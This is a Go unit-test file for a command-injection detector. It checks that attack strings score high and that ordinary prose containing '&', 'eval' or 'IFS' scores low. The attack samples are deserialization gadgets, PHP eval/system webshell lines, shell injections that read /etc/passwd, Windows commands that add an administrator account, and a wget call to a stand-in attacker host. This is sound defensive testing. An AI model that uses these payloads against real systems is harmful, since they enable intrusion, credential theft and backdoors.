package cmdi

import "testing"

func cmdiTotal(in string) int {
	t := 0
	for _, f := range Detect(in, "query") {
		t += f.Score
	}
	return t
}

func TestScriptExecAttacks(t *testing.T) {
	for _, a := range []string{
		`!!python/object/new:exec [import socket; socket.gethostbyname('x.example')]`,
		`!!python/object/apply:os.system ["id"]`,
		`!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://x.example/"]]]]`,
		`--- !ruby/object:Gem::Installer`,
		`rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhw`,
		`aced0005737200116a6176612e7574696c2e48617368`,
		`O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}`,
		`eval($_GET['x'])`,
		`system($_POST[0]);`,
		`eval(base64_decode($_REQUEST['c']))`,
		`eval request("x")`,
		`Ev al ("Ex"&"e"&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s)`,
		`;getent$IFS$9hosts$IFS$9somehost.example.net;echo$IFS$9$((3482*7301));`,
		`|getent hosts somehost.example.net.&`,
		`;cat${IFS}/etc/passwd`,
		`;cat$IFS/etc/passwd`,
	} {
		if got := cmdiTotal(a); got < 50 {
			t.Errorf("Detect(%q) = %d, want >= 50", a, got)
		}
	}
}

func TestScriptExecBenign(t *testing.T) {
	for _, b := range []string{
		`My YAML file uses the !important tag in comments`,
		`config: !!str 123`,
		`the java.util package is part of the standard library`,
		`see javax docs for details`,
		`O:5 ratio of oxygen`,
		`Order O:123 shipped`,
		`eval is risky, never run eval on request data`,
		`She said "hello" & "goodbye" in the speech`,
		`Tom & Jerry, "A" & "B"`,
		`IFS is a shell variable, the internal field separator`,
		`price is $IFS`,
		`the getent command looks up entries`,
		`ro0ab is a typo`,
	} {
		if got := cmdiTotal(b); got >= 50 {
			t.Errorf("Detect(%q) = %d, want < 50", b, got)
		}
	}
}

func TestRedirectionToKeyValueIsNotAFile(t *testing.T) {
	for _, b := range []string{`>url=/pi?mode=<;>`, `> url=/x?a=1`, `a >key=value`} {
		if got := cmdiTotal(b); got >= 40 {
			t.Errorf("Detect(%q) = %d, want < 40", b, got)
		}
	}
	for _, a := range []string{`echo x > /tmp/out`, `;cat /etc/passwd > out.txt`, `ls >&2`} {
		if got := cmdiTotal(a); got < 40 {
			t.Errorf("Detect(%q) = %d, want >= 40", a, got)
		}
	}
}

func TestWindowsAmpersandAndProse(t *testing.T) {
	for _, a := range []string{
		`& net user hacker P@ss /add`,
		`x & whoami`,
		`& ipconfig /all`,
		`a & net localgroup administrators hacker /add`,
		`1 & reg query HKLM\Software`,
		`& powershell -enc SQBFAFgA`,
		`; ping -c 10 127.0.0.1`,
		`; ping evil.example`,
		`name &whoami`,
		`test; wget http://evil.example/x`,
	} {
		if got := cmdiTotal(a); got < 50 {
			t.Errorf("Detect(%q) = %d, want >= 50", a, got)
		}
	}
	for _, b := range []string{
		`wget downloads files; ping checks reachability`,
		`curl fetches pages; nslookup resolves names to addresses`,
		`terms & conditions apply`,
		`Q & A session at noon`,
		`AT&T and Procter & Gamble`,
		`R&D budget & net income for the year`,
		`salt & pepper, cut & paste, rock & roll`,
		`fish &amp; chips`,
		`sc & net profit`,
	} {
		if got := cmdiTotal(b); got >= 50 {
			t.Errorf("Detect(%q) = %d, want < 50", b, got)
		}
	}
}
